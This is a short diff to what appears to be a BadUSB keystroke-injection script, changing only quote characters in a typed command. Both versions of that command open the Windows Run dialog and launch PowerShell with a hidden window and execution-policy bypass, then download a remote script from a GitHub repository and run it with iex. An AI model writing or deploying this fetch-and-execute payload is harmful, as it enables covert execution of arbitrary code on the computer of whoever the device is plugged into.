@@ -65,9 +65,9 @@ badusb.press("GUI", "r");
 delay(500);
 if (scriptName) {
   badusb.println(
-    'powershell -w h -Ep Bypass $scriptName="' +
+    "powershell -w h -Ep Bypass $scriptName='" +
       scriptName +
-      '";irm https://raw.githubusercontent.com/SuperJakov/Badusb/main/JS/Script-runner/Run-script.ps1 | iex'
+      "';irm https://raw.githubusercontent.com/SuperJakov/Badusb/main/JS/Script-runner/Run-script.ps1 | iex"
   );
 } else {
   badusb.println(
